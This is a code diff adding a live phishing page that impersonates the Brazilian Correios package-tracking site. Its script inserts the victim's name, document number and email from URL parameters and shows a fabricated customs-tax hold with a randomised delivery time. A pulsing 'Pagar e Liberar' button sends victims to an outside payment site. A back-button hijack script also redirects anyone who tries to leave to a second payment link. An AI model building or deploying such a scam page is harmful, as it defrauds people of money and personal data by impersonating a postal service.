@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <title>Rastreamento de Encomendas dos Correios</title>
+      <link rel="icon" type="image/x-icon" href="images/favi-ect.png">
+      <link rel="manifest" href="/manifest.json">
+      <meta name="theme-color" content="#317EFB">
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta property="og:description" content="Está esperando uma encomenda? Link &amp; Track é a solução para rastrear suas encomendas! Rastreie ou gere links para seus clientes ou destinatários!">
+      <meta property="og:image" content="images/trackfb.jpg">
+      <style>body{font-family:Roboto,sans-serif;background:linear-gradient(to left,#fafafa,#e0e0e0)}nav.sidenav-trigger.ml-0{margin-left:0}.block{display:block}.logo{font-size:11rem}.row.mb-0{margin-bottom:0}.col.p0{padding:0}.row .col.p-0{padding:0}div.pt4{padding-top:4rem}.col.pt1{padding-top:1rem}.dash{border-style:dashed}main{flex:1 0 auto}#inputCodigo{text-transform:uppercase}input.invalid{color:#f44336}input.valid{color:#4caf50}@media only screen and (max-width:600px){#subtitulo{font-size:1.6rem;max-width:100%}#logo-title{font-size:2.5rem}#rastrearBotao{display:block;margin-top:.3rem}#smallWidth{width:90%}}@media only screen and (min-width:601px){#subtitulo{font-size:1.5rem}#logo-title{font-size:2.6rem}#rastrearBotao{top:.6rem}}.pb-1{padding-bottom:1rem}.font-1-5{font-size:1.5rem}.font-1{font-size:1rem}.m-1{margin:1rem}.m-2{margin:2rem}.mb-0{margin-bottom:0!important}.mb-1{margin-bottom:1rem}.mb-2{margin-bottom:2rem!important}.mb-3{margin-bottom:3rem!important}.mb-5{margin-bottom:5rem}.mb-8{margin-bottom:8rem}.mb-10{margin-bottom:10rem}.mb-20{margin-bottom:20rem}.mt-0{margin-top:0!important}.mt-1{margin-top:1rem}.mt-2{margin-top:2rem!important}.mt-3{margin-top:3rem!important}.mt-4{margin-top:4rem!important}.mt-5{margin-top:5rem!important}.ml-0{margin-left:0!important}.ml-1{margin-left:1rem!important}.p-0{padding:0}.p-1{padding:1rem}.pl-1{padding-left:1rem}.px-1{padding-left:1rem;padding-right:1rem}.pt-2{padding-top:2rem!important}.ml-2{margin-left:2rem}.mr-1{margin-right:1rem!important}.mr-2{margin-right:2rem}.mx-1{margin-left:1rem;margin-right:1rem}.mx-2{margin-left:2rem;margin-right:2rem}.my-0{margin-top:0!important;margin-bottom:0!important}.my-1{margin-top:1rem!important;margin-bottom:1rem!important}.my-2{margin-top:2rem!important;margin-bottom:2rem!important}.my-5{margin-top:5rem;margin-bottom:5rem}.my-8{margin-top:8rem;margin-bottom:8rem}.my-3{margin-top:3rem;margin-bottom:3rem}.consulta{margin-bottom:2rem}.linketrack{font-family:Bungee,Sans-serif}.bold{font-weight:700}.italic{font-style:italic}.block{display:block!important}h1.linketrack{font-size:2rem}h2.linketrack{font-size:1.5rem}img.correios-img{max-height:4.5rem}input#cepInput{font-size:1.8rem}blockquote{border-left:5px solid orange}figure{text-align:center;font-style:italic;font-size:smaller;text-indent:0;border:thin silver solid;margin:.5em;padding:.5em}.content{margin-top:2rem;margin-bottom:2rem}.content-title{font-size:2rem}.content-subtitle{font-size:1.5rem;color:#009688!important}.primary-color{background:linear-gradient(to right,#009688,#4db6ac)}.secondary-color{background-color:orange!important}.primary-text{color:#009688!important}.secondary-text{color:orange!important}a.btn{background:orange;font-size:1rem;font-weight:700;color:#fafafa}a#linkInstall.disable,a.disable{background:0 0;box-shadow:none}nav ul li a.navlink{font-weight:400;z-index:0;margin-left:0;float:none;position:unset;height:36px;line-height:36px;margin:0}nav ul li a.navlink i{height:36px;line-height:36px}a.track-fab{position:absolute;right:.4rem;top:1.5rem;font-weight:400}a.ajuda-fab{position:absolute;right:.4rem;top:4.7rem;font-weight:400}.normal{background:linear-gradient(to top left,#a5d6a7,#4caf50)}.alerta{background:linear-gradient(to top left,#fff59d,#ffeb3b)}.transito{background:linear-gradient(to top left,#90caf9,#2196f3)}.perigo{background:linear-gradient(to top left,#e57373,#f44336)}.orange-background{background:linear-gradient(to left,#ffb74d,#ff9800)}.white-background{background:linear-gradient(to left,#fafafa,#e0e0e0)}.white-mono-background{background:#fafafa!important}.teal-background{background:linear-gradient(to left,#009688,#4db6ac)}.justificado{text-align:justify;text-justify:inter-word}.hide-element{display:none!important}.hidden{display:none!important}.collection.evento-collection{border-radius:.3rem}.dashed{border-style:dashed}.inline{display:inline}.font-display{font-family:Bungee,sans-serif}#minhasEncomendas{border:0!important}#fabMinhasEncomendas{position:absolute;right:-1rem;bottom:-1rem}table#legenda{width:fit-content}table#legenda tbody td{padding-top:0;padding-bottom:0}table#legenda tbody td.cor{width:3rem;padding:0}@media only screen and (max-width:600px){div.map{width:100%;margin:auto;height:20rem}}@media only screen and (min-width:601px){div.map{width:100%;margin-left:auto;margin-right:auto;padding-bottom:200px}div.map>iframe{height:200px}}@media only screen and (min-width:993px){a.btn.navlink.show-on-large{display:inline-block!important}}.grecaptcha-badge{opacity:0!important}span#google_privacy{font-size:.9rem!important}ins.adsbygoogle{max-width:100%!important;width:100%!important}.button-width{width:10.5rem;margin:.5rem}#minhasEncomendas,.boxEvento.collection,.footer-collection.collection,a.btn{border-radius:2px 8px 8px 8px!important}img.responsive-img.status-img{max-width:20rem}.adslt{margin:0 auto;max-width:1280px;width:100%;overflow:hidden;text-align:center}@media only screen and (min-width:601px){.adslt{width:85%}}@media only screen and (min-width:993px){.adslt{width:70%}}@media only screen and (min-width:1000px){footer{bottom:0;width:100%;z-index:100}}</style>
+ 
+
+ <style>
+   
+.center-align {
+    text-align: center;
+}
+
+
+.bold {
+    font-weight: bold;
+}
+
+.italic {
+    font-style: italic;
+}
+
+
+.green-text {
+    color: green;
+}
+
+.blue-text {
+    color: blue;
+}
+
+
+    </style>
+   <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function getParameterByName(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const param = urlParams.get(name);
+        if(param){
+            return decodeURIComponent(param);
+        }
+        return param;
+    }
+
+    const codigo = getParameterByName('codigo');
+    if (codigo) {
+        document.getElementById('codigo').textContent = codigo;
+    } else {
+        document.getElementById('codigo').textContent = '**********************';
+    }
+
+    const local = getParameterByName('local');
+    if (local) {
+        document.querySelectorAll('.local').forEach(element => {
+            element.textContent = local.replace(/\+/g, ' ');
+        });
+    } else {
+        document.querySelectorAll('.local').forEach(element => {
+            element.textContent = 'Local não encontrado';
+        });
+    }
+
+    const dataEnvio = getParameterByName('denvio');
+    const horaEnvio = getParameterByName('henvio');
+    if (dataEnvio && horaEnvio) {
+        document.querySelectorAll('.denvio').forEach(element => {
+            element.textContent = dataEnvio;
+        });
+        document.querySelectorAll('.henvio').forEach(element => {
+            element.textContent = horaEnvio;
+        });
+
+        // Calcular 3 dias após a data de envio
+        const dataEnvioDate = new Date(dataEnvio.split('/').reverse().join('-'));
+        const dataEntregaDate = new Date(dataEnvioDate.getTime() + 3 * 24 * 60 * 60 * 1000);
+        const formattedDataEntrega = new Intl.DateTimeFormat('pt-BR').format(dataEntregaDate);
+        
+        // Gerar hora de entrega aleatória
+        const randomHour = Math.floor(Math.random() * 24);
+        const randomMinute = Math.floor(Math.random() * 60);
+        const randomSecond = Math.floor(Math.random() * 60);
+        const horaEntrega = `${String(randomHour).padStart(2, '0')}:${String(randomMinute).padStart(2, '0')}:${String(randomSecond).padStart(2, '0')}`;
+        
+        document.querySelectorAll('.denvio-entrega').forEach(element => {
+            element.textContent = formattedDataEntrega;
+        });
+        document.querySelectorAll('.henvio-entrega').forEach(element => {
+            element.textContent = horaEntrega;
+        });
+    } else {
+        document.querySelectorAll('.denvio').forEach(element => {
+            element.textContent = 'Data e hora não encontradas';
+        });
+        document.querySelectorAll('.henvio').forEach(element => {
+            element.textContent = 'Data e hora não encontradas';
+        });
+    }
+
+    const now = new Date();
+    const formattedDate = new Intl.DateTimeFormat('pt-BR', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    }).format(now);
+    document.getElementById('current-date').textContent = formattedDate;
+
+    const oneDayBefore = new Date(now);
+    oneDayBefore.setDate(oneDayBefore.getDate() - 1);
+    const formattedOneDayBefore = new Intl.DateTimeFormat('pt-BR', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    }).format(oneDayBefore);
+
+    document.querySelectorAll('.data-um-dia-antes').forEach(element => {
+        element.textContent = formattedOneDayBefore;
+    });
+
+    const name = getParameterByName('name');
+    if (name) {
+        document.querySelectorAll('.name').forEach(element => {
+            element.textContent = name.replace(/\+/g, ' ');
+        });
+    } else {
+        document.querySelectorAll('.name').forEach(element => {
+            element.textContent = '************************';
+        });
+    }
+
+    const documentParam = getParameterByName('document');
+    if (documentParam) {
+        document.querySelectorAll('.document').forEach(element => {
+            element.textContent = documentParam.replace(/\+/g, ' ');
+        });
+    } else {
+        document.querySelectorAll('.document').forEach(element => {
+            element.textContent = '****************************';
+        });
+    }
+
+    const email = getParameterByName('email');
+    if (email) {
+        document.querySelectorAll('.email').forEach(element => {
+            element.textContent = email;
+        });
+    } else {
+        document.querySelectorAll('.email').forEach(element => {
+            element.textContent = '*****************************';
+        });
+    }
+  });
+</script>
+
+
+</script>
+<!-- Estilo botão Piscando-->
+<style>
+    /* Estilo para o botão personalizado */
+    .custom-button {
+        background-color: green; /* Fundo verde */
+        color: white; /* Texto branco */
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease, color 0.3s ease; /* Transição suave para hover */
+        text-decoration: auto;
+    }
+
+    .custom-button:hover {
+        background-color: #2407f5; /* Altera o fundo para uma tonalidade mais clara ao passar o mouse */
+        color: #fff;
+    }
+   .btn-pulse:hover {
+        transform: scale(1.02);
+        box-shadow: 0 5px 20px -6px #00c95d;
+    }
+  .btn-pulse {
+        animation: pisca 1.5s infinite;
+        box-shadow: 0px 0px 10px -6px #00c95d;
+    }
+
+    @keyframes pisca {
+        70% {
+            box-shadow: 0 0 0 12px #00000000;
+        }
+
+        100% {
+            box-shadow: 0 0 0 0 #00000000;
+        }
+    }
+    .botaoliberar {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 10vh;
+}
+</style>
+<!-- Efeito Botão Pulsando -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+   </head>
+   <body>
+      <span hidden="">RASTREAMENTO</span>
+        <link rel="stylesheet" href="">
+        <div class="rastreamento center-align my-2">
+          <div class="consulta">
+            <img class="responsive-img correios-img" src="images/correios.png" alt="Logo da Loja">
+            <h5 id="codigo" class="codigo bold"></h5>
+            <h5><b><span class="name"></span></b></h5>
+            <p><b>Email: </b><span class="email"></span></p>
+            <h5><b><span class="nomeprod"></span></b></h5>
+            <h7 class="servico italic"></h7>
+            <p>Objeto aguardando liberação aduaneira</p>
+            <div class="col s12"></div>
+            <img class="responsive-img status-img" src="https://i.imgur.com/KpsJQIS.png" alt="Imagem que representa o status do rastreamento">
+            <div class="servico italic">
+              <p><b>DATA: </b><span id="current-date"></span></p>
+            </div>
+          </div>
+        </div>
+      <div class="botaoliberar">
+        <!-- Botão -->
+        <a href="https://pay.seguropag.org/nOzxZo1WlmEgJ07" class="custom-button btn-pulse" style="background-color: green;"> <!-- Alterando a cor do fundo para verde -->
+            <span class="material-symbols-outlined" style="vertical-align: middle;">payment</span> <!-- Adicionando o estilo para alinhar verticalmente o ícone -->
+            <span style="font-family: Arial;">Pagar</span> e Liberar
+        </a>
+    </div>
+      <div class="container">
+         <div class="rastreamento center-align">
+            <div class="status">
+                   <ul class="collection left-align z-depth-5 black-text evento-collection boxEvento red">
+        <li class="collection-item amber lighten-3 alerta status-box">
+            <span class="bold eventoLocal">Local: </span>CURITIBA - PR
+            <a class="btn-floating track-fab waves-effect waves-light white">
+                    <span class="material-symbols-outlined yellow-text">local_shipping</span>
+                </a>
+        </li>
+        <li class="collection-item col m6">
+            <span class="bold">Data: </span><span class="data-um-dia-antes"></span>
+        </li>
+        <li class="collection-item col m6">
+            <a class="pulse btn-floating ajuda-fab waves-effect waves-light white blue-text" href="#">
+                    <span class="material-symbols-outlined yellow-text">help</span>
+                </a>
+            <span class="bold eventoStatus">Objeto aguardando<br>pagamento de impostos</span>
+        </li>
+    </ul>
+
+                <ul class="collection left-align z-depth-5 black-text evento-collection boxEvento red">
+        <li class="collection-item blue lighten-3 transito status-box">
+            <span class="bold eventoLocal">Local: </span><span class="local"></span>
+            <a class="btn-floating track-fab waves-effect waves-light white">
+                <span class="material-symbols-outlined blue-text">local_shipping</span>
+            </a>
+        </li>
+        <li class="collection-item col m6">
+            <span class="bold">Data: </span><span class="denvio-entrega"></span> as <span class="henvio-entrega"></span>
+        </li>
+        <li class="collection-item col m6">
+            <a class="pulse btn-floating ajuda-fab waves-effect waves-light white blue-text" href="#">
+                <span class="material-symbols-outlined blue-text">help</span>
+            </a>
+            <span class="bold eventoStatus">Objeto encaminhado</span>
+        </li>
+    </ul>
+
+    <ul class="collection left-align z-depth-5 black-text evento-collection boxEvento red">
+        <li class="collection-item green lighten-3 normal status-box">
+            <span class="bold eventoLocal">Local: </span><span class="local"></span>
+            <a class="btn-floating track-fab waves-effect waves-light white">
+                <span class="material-symbols-outlined green-text">schedule</span>
+            </a>
+        </li>
+        <li class="collection-item col m6">
+            <span class="bold">Data: </span><span class="denvio"></span> as </span><span class="henvio"></span>
+        </li>
+        <li class="collection-item col m6">
+            <a class="pulse btn-floating ajuda-fab waves-effect waves-light white green-text" href="#">
+                <span class="material-symbols-outlined green-text">help</span>
+            </a>
+            <span class="nproduto bold"></span>
+            <span class="bold eventoStatus">Objeto postado após o horário limite da unidade</span>
+        </li>
+    </ul>
+            </div>
+         </div>
+      </div>
+     <!-- Footer -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
+     <footer id="rodape">
+    <div class="recipiente largura-maxima">
+        <div class="rodape-links">
+            <h2>Fale Conosco</h2>
+            <ul class="lista-icone">
+                <li>
+                    <a href="#">
+                        <i class="material-icons">feedback</i>
+                        <span>Registro de Manifestações</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">help_outline</i>
+                        <span>Central de Atendimento</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">business</i>
+                        <span>Soluções para o seu negócio</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">headset_mic</i>
+                        <span>Suporte ao cliente com contrato</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">hearing</i>
+                        <span>Ouvidoria</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">report</i>
+                        <span>Denúncia</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="rodape-links">
+            <h2>Sobre os Correios</h2>
+            <ul class="lista-icone">
+                <li>
+                    <a href="#">
+                        <i class="material-icons">business</i>
+                        <span>Identidade corporativa</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">school</i>
+                        <span>Educação e cultura</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">verified_user</i>
+                        <span>Código de ética</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <i class="material-icons">privacy_tip</i>
+                        <span>Política de Privacidade e Notas Legais</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+       <div class="rodape-links">
+            <h2>Outros Sites</h2>
+            <ul class="lista-icone">
+                <li>
+                    <a href="#">
+                        <i class="material-icons">store</i>
+                        <span>Loja online dos Correios</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="marca-gov">
+    </div>
+    <p></p>
+    <div class="copyright">© Copyright 2024</div>
+            <p></p>
+        </footer>
+<!-- Estilos CSS -->
+<style>
+    #rodape {
+        background-color: #ffe600; /* Adiciona fundo amarelo */
+        text-align: left; /* Alinha o texto à esquerda */
+    }
+
+    .rodape-links h2 {
+        color: #00416b; /* Cor do texto dos títulos */
+    }
+
+    .lista-icone .material-icons {
+        color: #00416b; /* Cor dos ícones */
+    }
+
+    .lista-icone span {
+        color: #00416b; /* Cor do texto dos itens */
+    }
+    .recipiente.largura-maxima {
+    padding: 13px;
+}
+.copyright {
+    margin: 10px 10px;
+    padding: 20px 0;
+}
+.rodape-links h2 {
+    color: #00416b;
+    font-size: 26px;
+    font-weight: 700;
+}
+</style>
+      <link rel="stylesheet" href="css/materialize.min.css">
+      <link href="https://fonts.googleapis.com/css?family=Bungee" rel="stylesheet">
+      <link rel="stylesheet" href="css/fontawesome.css" crossorigin="anonymous">
+      <link rel="stylesheet" href="css/solid.css" crossorigin="anonymous">
+      <link rel="stylesheet" href="css/brands.css" crossorigin="anonymous">
+      <script src="js/materialize.min.js"></script><script src="js/imask.min.js"></script>
+      <!-- Script Utms -->
+            <script>
+            // Função para adicionar os parâmetros aos links
+            function adicionarParametrosAosLinks() {
+                const urlParams = new URLSearchParams(window.location.search);
+
+                const links = document.querySelectorAll('a');
+
+                links.forEach(link =>  {
+                    const href = new URL(link.href);
+                    urlParams.forEach((value, key) => {
+                        href.searchParams.set(key, value);
+                    });
+                    link.href = href.toString();
+                });
+            }
+
+            // Chamar a função ao carregar a página
+            document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+            </script>
+  <!-- Script Utms -->
+  <!-- Backredirect -->
+    <script>
+        var urlBackRedirect = 'https://pay.seguropag.org/YEwR3ArLr7PZdKy'; // Lembre-se de usar a URL sem espaços
+        // Não altere nada abaixo dessa linha
+
+        urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+
+        history.pushState({}, "", location.href);
+        history.pushState({}, "", location.href);
+
+        window.onpopstate = function () {
+            setTimeout(function () {
+                location.href = urlBackRedirect;
+            }, 1);
+        };
+    </script>
+    <!-- Backredirect -->
+   </body>
+</html>
